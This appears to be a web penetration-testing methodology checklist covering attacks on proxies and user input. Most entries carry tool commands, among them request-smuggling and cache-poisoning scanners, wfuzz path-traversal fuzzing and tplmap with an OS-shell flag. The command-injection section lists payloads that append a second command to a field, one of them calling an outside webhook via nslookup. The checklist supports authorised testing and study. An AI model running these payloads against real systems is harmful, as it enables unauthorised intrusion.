# Methodology

## Proxies
- 🟥 Abusing hop-by-hop headers
```bash
// Tool hbh-header-abuse-test
for HEADER in $(cat /usr/share/seclists/Discovery/Web-Content/BurpSuite-ParamMiner/lowercase-headers); do python3 hbh-header-abuse-test.py -u <url> -x "$HEADER" -v; :'sleep 1'; done
```
- 🟥 Cache Poisoning/Cache Deception
```bash
// Tool Web-Cache-Vulnerability-Scanner
go install -v github.com/Hackmanit/Web-Cache-Vulnerability-Scanner@latest
cp go/Web-Cache-Vulnerability-Scanner tools/Web-Cache-Vulnerability-Scanner/wcvs
cd tools/Web-Cache-Vulnerability-Scanner/
./wcvs -u <url> -hw wordlists/headers -pw wordlists/parameters -f
```
- 🟥 HTTP Request Smuggling 
```bash
// Burp - HTTP Request Smuggler
- Right click on a request and click Extensions > HTTP HTTP Request Smuggler > Smuggle Probe.

// Tool Smuggler by gwen001
wget https://raw.githubusercontent.com/gwen001/pentest-tools/master/smuggler.py
python3 smuggler.py -u <url> -v 3
```
- 🟥 H2C Smuggling
```
// Tool h2csmuggler
python3 h2csmuggler.py -x <url> -t --threads 5 -v
```
- 🟥 Uncovering Cloudflare
- 🟥 XSLT Server Side Injection

## User input
### Reflected Values
- 🟥 Client Side Template Injection (Like SSTI)
- 🟥 Command Injection
```
// Tool commix
commix -r <REQUESTFILE> -p <TEST_PARAMETER>

// Test delay
original_cmd_by_server;sleep+5
original_cmd_by_server&&sleep+5
original_cmd_by_server|sleep+5
original_cmd_by_server||sleep+5

// Test when no effect on the application's response
original_cmd_by_server;nslookup+<webhook>
```
- 🟥 CRLF
```
// Tool crlfuzz
crlfuzz -u <url>
```
- 🟥 Dangling Markup
- 🟥 File Inclusion/Path Traversal
```
// Fast Fuzzing
wfuzz -c -w /usr/share/wfuzz/wordlist/Injections/Traversal.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
// Deep Fuzzing (recommend)
wfuzz -X GET -c -w file_inclusion_linux.txt --hw 0 http://10.10.10.10/nav.php?page=FUZZ
wfuzz -X POST -c -w file_inclusion_linux.txt --hw 0 -d "foo=FUZZ" http://10.10.10.10/nav.php

// Can use Burp Active Scanner
```
- 🟥 Open Redirect (Detected by Burp Scanner)
- 🟥 Prototype Pollution to XSS (NodeJS)
- 🟥 Server Side Inclusion/Edge Side Inclusion (Detected by Burp Scanner)
- 🟥 Server Side Request Forgery
- 🟥 Server Side Template Injection (Detected by Burp Scanner)
```
// Tool tplmap
python2 tplmap.py -u 'http://10.10.10.10/page?name=Box*' --os-shell
```
- 🟥 Reverse Tab Nabbing
- 🟥 XSLT Server Side Injection
- 🟥 XSS
- 🟥 XSSI
- 🟥 XS-Search

